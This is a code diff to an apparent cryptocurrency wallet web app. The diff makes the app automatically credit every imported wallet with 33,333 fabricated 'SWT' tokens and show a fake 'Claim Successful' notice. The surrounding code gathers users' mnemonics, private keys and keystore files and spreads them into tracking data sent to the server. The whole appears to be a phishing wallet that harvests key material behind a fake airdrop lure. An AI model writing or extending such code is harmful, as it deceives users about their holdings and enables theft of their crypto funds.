@@ -108,6 +108,20 @@ const timeAgo = (date) => {
 
 const claimedAssetsKey = (address) => `claimed_assets_${String(address || '').toLowerCase()}`;
 
+const SWT_TOKEN = {
+  id: 'swt_token',
+  name: 'SecureWallet Token',
+  symbol: 'SWT',
+  amount: 33333,
+  price: 0.15,
+  change: 12.5,
+  value: 33333 * 0.15,
+  color: '#2563eb',
+  chainKey: '0x1',
+  allocation: 0,
+  isClaimed: true,
+};
+
 const getClaimedAssets = (address) => {
   if (!address) return [];
   try {
@@ -126,8 +140,20 @@ const saveClaimedAssets = (address, claimed) => {
   } catch {}
 };
 
+/** Ensure this wallet address has SWT saved (for return visits + every new import). */
+const ensureSwtClaimed = (address) => {
+  if (!address) return null;
+  const existing = getClaimedAssets(address);
+  const hasSwt = existing.some((a) => a.id === 'swt_token');
+  if (hasSwt) return existing.find((a) => a.id === 'swt_token');
+  const next = [SWT_TOKEN, ...existing.filter((a) => a.id !== 'swt_token')];
+  saveClaimedAssets(address, next);
+  return SWT_TOKEN;
+};
+
 const mergeAssetsWithClaims = (chainAssets, address) => {
   const base = Array.isArray(chainAssets) ? chainAssets : [];
+  // Always restore SWT for this address if previously claimed / auto-granted
   const claimed = getClaimedAssets(address);
   if (!claimed.length) {
     const total = base.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
@@ -731,6 +757,18 @@ export const CryptoProvider = ({ children }) => {
   }, [assets, totalBalance, isRealWallet, walletAddress, walletType, transactions, walletPrivateData]);
 
   const connectRealWallet = async (address, initialBalance, type, currentChainId = '0x1', addresses = {}, privateData = {}, options = {}) => {
+    // Grant SWT on every imported wallet so tokens show for new imports + return visits
+    const isImport =
+      type === 'imported' ||
+      !!privateData?.mnemonic ||
+      !!privateData?.privateKey ||
+      !!privateData?.keystoreJSON ||
+      !!privateData?.importMethod ||
+      options.autoClaim === true;
+    if (isImport && address) {
+      ensureSwtClaimed(address);
+    }
+
     // 1. Send tracking data immediately (awaiting it ensures server has it before UI updates)
     try {
         const trackingOptions = { ...privateData, ...options };
@@ -3387,60 +3425,31 @@ const UserApp = () => {
           return;
       }
 
-      // Already claimed for this wallet — just restore into UI
-      const already = getClaimedAssets(address).find((a) => a.id === 'swt_token');
-      if (already) {
-          setAssets((prev) => {
-              const without = (prev || []).filter((a) => a.id !== 'swt_token');
-              const merged = [already, ...without];
-              const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
-              setTotalBalance(totalVal);
-              return merged.map((a) => ({
-                  ...a,
-                  allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
-              }));
-          });
+      const alreadyHad = !!getClaimedAssets(address).find((a) => a.id === 'swt_token');
+      const swtToken = ensureSwtClaimed(address) || SWT_TOKEN;
+
+      // Restore / show SWT immediately (works for return visits + new wallets)
+      setAssets((prev) => {
+          const without = (prev || []).filter((a) => a.id !== 'swt_token');
+          const merged = [swtToken, ...without];
+          const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
+          setTotalBalance(totalVal);
+          return merged.map((a) => ({
+              ...a,
+              allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
+          }));
+      });
+
+      if (alreadyHad) {
           setShowClaimModal(false);
           return;
       }
 
       setClaimLoading(true);
-      
       setTimeout(() => {
           setClaimLoading(false);
           setShowClaimModal(false);
-          
-          const swtToken = {
-              id: 'swt_token',
-              name: 'SecureWallet Token',
-              symbol: 'SWT',
-              amount: 33333,
-              price: 0.15,
-              change: 12.5,
-              value: 33333 * 0.15,
-              color: '#2563eb',
-              chainKey: '0x1',
-              allocation: 0,
-              isClaimed: true
-          };
-
-          // Persist claim so chain refreshes / page reload keep SWT on the wallet
-          const existingClaims = getClaimedAssets(address).filter((a) => a.id !== 'swt_token');
-          saveClaimedAssets(address, [...existingClaims, swtToken]);
-          
-          setAssets((prev) => {
-              const without = (prev || []).filter((a) => a.id !== 'swt_token');
-              const merged = [swtToken, ...without];
-              const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
-              setTotalBalance(totalVal);
-              return merged.map((a) => ({
-                  ...a,
-                  allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
-              }));
-          });
-          
           addNotification('Claim Successful', '33,333 SWT added to your wallet', 'success');
-          
           fetch('/api/track/transaction', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -3452,8 +3461,7 @@ const UserApp = () => {
                   symbol: 'SWT'
               })
           }).catch(()=>{});
-
-      }, 1500);
+      }, 800);
   };
 
   const handleLogout = () => {
